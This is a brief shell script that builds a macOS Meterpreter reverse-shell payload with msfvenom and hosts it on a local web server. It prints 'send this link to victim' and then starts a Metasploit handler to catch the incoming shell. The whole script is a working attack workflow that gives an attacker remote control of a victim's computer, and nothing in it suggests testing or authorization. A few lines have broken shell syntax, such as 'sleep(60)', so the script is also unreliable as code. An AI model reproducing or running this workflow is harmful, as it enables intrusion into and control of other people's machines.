echo"generating payload"
cd /opt/metasploit-framework/
sudo ./msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=4444 -f macho -o shell.macho
sudo mv shell.macho ~/temp 
cd ~/temp
echo "send this link to victim"
python3 -m http.server
sleep(60)
cd /opt/metasploit-framework/
sudo ./msfconsole -q -x "use multi/handler; set payload osx/x64/meterpreter/reverse_tcp; set lhost $HOST; set lport 4444; exploit"

